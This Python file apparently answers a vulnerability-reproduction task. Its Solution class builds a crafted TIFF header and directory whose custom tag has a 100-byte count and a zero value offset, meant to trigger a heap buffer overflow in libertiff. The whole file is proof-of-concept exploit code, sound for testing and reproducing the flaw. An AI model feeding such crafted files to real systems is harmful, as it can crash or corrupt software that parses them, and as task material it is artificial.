import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        The vulnerability is a Heap Buffer Overflow caused by an invalid offline tag 
        with a value offset of zero in libertiff.
        """
        # TIFF Header
        # Byte order: Little Endian 'II' (0x4949)
        # Version: 42 (0x002A)
        # Offset to first IFD: 8
        header = struct.pack('<2sHI', b'II', 42, 8)

        # Directory Entries
        entries = []

        # Helper to create a 12-byte directory entry
        # Format: Tag (2), Type (2), Count (4), Value/Offset (4)
        def create_entry(tag, dtype, count, val):
            return struct.pack('<HHII', tag, dtype, count, val)

        # Add standard tags to ensure the parser processes the file as a valid TIFF
        # Tags must be sorted by Tag ID
        entries.append(create_entry(256, 3, 1, 256))     # ImageWidth (SHORT, val=256)
        entries.append(create_entry(257, 3, 1, 256))     # ImageLength (SHORT, val=256)
        entries.append(create_entry(258, 3, 1, 8))       # BitsPerSample (SHORT, val=8)
        entries.append(create_entry(259, 3, 1, 1))       # Compression (SHORT, val=1 None)
        entries.append(create_entry(262, 3, 1, 1))       # PhotometricInterpretation (SHORT, val=1 BlackIsZero)
        entries.append(create_entry(273, 4, 1, 8))       # StripOffsets (LONG, val=8 points to header)
        entries.append(create_entry(277, 3, 1, 1))       # SamplesPerPixel (SHORT, val=1)
        entries.append(create_entry(278, 4, 1, 256))     # RowsPerStrip (LONG, val=256)
        entries.append(create_entry(279, 4, 1, 1024))    # StripByteCounts (LONG, val=1024)

        # The Vulnerability Trigger
        # "invalid offline tags with a value offset of zero"
        # Tag: 65535 (0xFFFF) - Unknown/Custom tag
        # Type: 1 (BYTE)
        # Count: 100 (Size = 100 bytes, which is > 4 bytes, so it's "offline")
        # Offset: 0 (The problematic offset pointing to start of file)
        entries.append(create_entry(65535, 1, 100, 0))

        # Construct the IFD
        # Number of entries (2 bytes)
        num_entries = struct.pack('<H', len(entries))
        # Entries data
        entries_data = b''.join(entries)
        # Offset to next IFD (4 bytes) - 0 (None)
        next_ifd = struct.pack('<I', 0)

        poc = header + num_entries + entries_data + next_ifd
        return poc